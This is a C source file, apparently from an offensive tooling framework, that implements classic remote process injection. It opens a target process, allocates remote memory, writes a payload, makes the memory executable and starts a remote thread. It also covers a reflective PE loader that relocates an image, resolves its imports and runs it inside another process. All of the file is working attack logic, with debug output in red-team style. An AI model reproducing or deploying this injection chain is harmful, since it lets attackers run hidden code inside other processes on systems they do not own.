#include <sindri/common/debug.h>
#include <sindri/common/status.h>
#include <sindri/injection/classic/chain.h>
#include <sindri/injection/context.h>
#include <sindri/loaders/reflective/engine.h>
#include <windows.h>

snd_status_t snd_inj_classic_shell(snd_inj_ctx_t *ctx) {
    if (!ctx)
        return SND_ERR(SND_STATUS_NULL_POINTER);

    snd_status_t status;

    SND_DEBUG_PRINT("[*] Initiating classic injection chain...\n");

    status = snd_inj_classic_open_target(ctx);
    if (SND_FAILED(status))
        return status;

    SND_DEBUG_PRINT("[+] Process handle acquired: 0x%p\n", ctx->target_process);

    status = snd_inj_classic_alloc_remote(ctx);
    if (SND_FAILED(status))
        return status;

    SND_DEBUG_PRINT("[+] Remote allocation at: 0x%p\n", ctx->remote_base);

    status = snd_inj_classic_write_payload(ctx);
    if (SND_FAILED(status))
        return status;

    SND_DEBUG_PRINT("[+] Payload written\n");

    status = snd_inj_classic_set_protections(ctx);
    if (SND_FAILED(status))
        return status;

    SND_DEBUG_PRINT("[+] Memory protections set to PAGE_EXECUTE_READ\n");

    status = snd_inj_classic_execute(ctx);
    if (SND_FAILED(status))
        return status;

    SND_DEBUG_PRINT("[+] Remote thread created.\n");

    SND_DEBUG_PRINT("[+] Injection chain completed successfully.\n");
    return SND_OK;
}

snd_status_t snd_inj_classic_pe(snd_ldr_pe_ctx_t *ldr_ctx, snd_inj_ctx_t *inj_ctx) {
    if (!ldr_ctx || !inj_ctx || !ldr_ctx->raw_source)
        return SND_ERR(SND_STATUS_NULL_POINTER);

    snd_status_t status;
    snd_buffer_t inject_buf = {0};

    SND_DEBUG_PRINT("[*] Preparing and parsing reflective image layout...\n");

    status = snd_pe_parse(ldr_ctx->raw_source, FALSE, &ldr_ctx->pe);
    if (SND_FAILED(status))
        return status;
    ldr_ctx->stage = SND_STAGE_PARSED;

    status = snd_ldr_pe_compatibility_check(ldr_ctx);
    if (SND_FAILED(status))
        return status;

    status = snd_ldr_pe_allocate_and_copy_image(ldr_ctx);
    if (SND_FAILED(status))
        return status;

    inject_buf.data  = ldr_ctx->target.local_base;
    inject_buf.size  = ldr_ctx->target.allocated_size;
    inj_ctx->payload = &inject_buf;

    SND_DEBUG_PRINT("[*] Initializing classic remote injection targeting PID %lu...\n",
                    (unsigned long)inj_ctx->target_pid);

    status = snd_inj_classic_open_target(inj_ctx);
    if (SND_FAILED(status))
        return status;

    status = snd_inj_classic_alloc_remote(inj_ctx);
    if (SND_FAILED(status))
        return status;

    ldr_ctx->target.execution_base = (PVOID)inj_ctx->remote_base;

    status = snd_ldr_pe_apply_relocations(ldr_ctx);
    if (SND_FAILED(status))
        return status;

    status = snd_ldr_pe_resolve_imports(ldr_ctx);
    if (SND_FAILED(status))
        return status;

    status = snd_inj_classic_write_payload(inj_ctx);
    if (SND_FAILED(status))
        return status;

    status = snd_inj_classic_set_protections(inj_ctx);
    if (SND_FAILED(status))
        return status;

    DWORD ep_rva = SND_PE_GET_NT_FIELD(&ldr_ctx->pe, OptionalHeader.AddressOfEntryPoint);

    SND_DEBUG_PRINT("[+] PE baking complete. Remote Base Allocation: 0x%p\n", inj_ctx->remote_base);

    PVOID remote_entry_point = (PVOID)((ULONG_PTR)inj_ctx->remote_base + ep_rva);

    SND_DEBUG_PRINT("[*] Adjusting execution target to remote Entry Point: 0x%p (Offset: +0x%lx)\n", remote_entry_point,
                    ep_rva);

    inj_ctx->remote_entry_point = remote_entry_point;

    status = snd_inj_classic_execute(inj_ctx);
    if (SND_FAILED(status))
        return status;

    SND_DEBUG_PRINT("\n[+] Remote payload execution thread created successfully.\n");

    return SND_OK;
}
